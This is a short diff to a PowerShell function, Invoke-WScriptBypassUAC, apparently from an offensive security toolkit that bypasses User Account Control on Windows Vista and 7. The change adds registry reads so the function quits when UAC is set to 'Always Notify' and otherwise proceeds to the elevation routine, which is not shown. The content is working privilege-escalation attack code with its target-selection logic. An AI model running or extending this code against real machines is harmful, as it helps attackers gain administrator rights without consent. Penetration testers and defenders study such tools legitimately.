@@ -172,14 +172,23 @@ function Invoke-WScriptBypassUAC
         }
     }
 
-    #make sure we are running on vulnerable windows version (vista,7)
+    #make sure we are running on vulnerable windows version (vista,7) and UAC isn't set to Always Notify
+    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
+    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
     $OSVersion = [Environment]::OSVersion.Version
     if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2))){
         if(([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") -eq $True){
             "[!] WARNING: You are already elevated!"
         }
         else {
-            Invoke-WscriptElevate
+            if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
+                "UAC is set to 'Always Notify'. This module does not bypass this setting."
+                exit
+            }
+            else{
+                Invoke-WscriptElevate
+            }
+            
         }
     }else{"[!] WARNING: Target Not Vulnerable"}
 }
